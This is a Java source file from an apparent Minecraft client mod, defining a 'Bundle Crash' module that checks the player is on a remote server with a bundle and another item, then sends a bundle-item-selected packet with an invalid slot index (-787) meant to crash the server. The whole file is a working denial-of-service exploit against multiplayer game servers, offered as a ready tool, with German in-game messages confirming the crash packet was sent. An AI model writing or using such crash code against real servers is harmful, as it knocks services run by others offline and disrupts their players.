package org.leycm.giraffen.module.modules.crasher;

import net.minecraft.client.MinecraftClient;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.BundleItemSelectedC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.text.Text;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import org.leycm.giraffen.module.common.CrasherModule;

public class BundleCrashModule extends CrasherModule {
    protected BundleCrashModule() {
        super("Bundle Crash", "crasher", "bundle-crash");
    }

    @Override
    protected void onEnable() {
        MinecraftClient client = MinecraftClient.getInstance();
        if (client.player == null) return;

        if(client.getServer() != null) {
            client.player.sendMessage(Text.of("§cDieser Crash funktioniert nur auf Servern!"), false);
            return;
        }
        if (!hasRequiredItems()) {
            client.player.sendMessage(Text.of("§cDu benötigst mindestens 1 Bundle und 1 weiteres Item im Inventar!"), false);
            return;
        }

        crashServer();
        client.player.sendMessage(Text.of("§aCrash-Packet gesendet!"), false);

    }

    private boolean hasRequiredItems() {
        MinecraftClient client = MinecraftClient.getInstance();
        if (client.player == null) return false;

        boolean hasBundle = false;
        boolean hasOtherItem = false;

        for (ItemStack stack : client.player.getInventory().main) {
            if (stack.getItem() == Items.BUNDLE) {
                hasBundle = true;
            } else if (!stack.isEmpty()) {
                hasOtherItem = true;
            }

            if (hasBundle && hasOtherItem) return true;
        }

        return false;
    }

    private void crashServer() {
        MinecraftClient client = MinecraftClient.getInstance();
        if (client.player == null || client.getNetworkHandler() == null) return;

        BundleItemSelectedC2SPacket packet = new BundleItemSelectedC2SPacket(
                0,
                -787
        );

        client.getNetworkHandler().sendPacket(packet);
    }

}
